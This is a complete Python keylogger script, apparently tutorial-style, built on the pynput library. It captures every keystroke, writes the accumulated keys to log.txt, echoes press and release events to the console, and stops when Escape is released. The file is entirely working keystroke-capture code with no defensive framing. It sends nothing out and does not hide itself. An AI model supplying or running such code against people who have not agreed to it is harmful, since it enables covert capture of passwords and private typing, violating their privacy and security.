# Import necessary modules from pynput library
import pynput
from pynput.keyboard import Key, Listener

# Initialize an empty list to store pressed keys
keys = []

# Function to be called when a key is pressed
def on_press(key):
    # Append the pressed key to the list
    keys.append(key)
    # Call the write_file function to write the keys to a file
    write_file(keys)

    try:
        # If the pressed key is alphanumeric, print a message
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        # If the pressed key is a special key, print a message
        print('special key {0} pressed'.format(key))

# Function to write the pressed keys to a file
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # Removing the single quotes around the key
            k = str(key).replace("'", "")
            # Write the key to the file
            f.write(k)
            # Add a space between each keystroke for readability
            f.write(' ')

# Function to be called when a key is released
def on_release(key):
    # Print a message indicating which key is released
    print('{0} released'.format(key))
    # If the Escape key is pressed, stop the listener
    if key == Key.esc:
        return False

# Create a listener object that listens for key presses and releases
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener and keep it running
    listener.join()
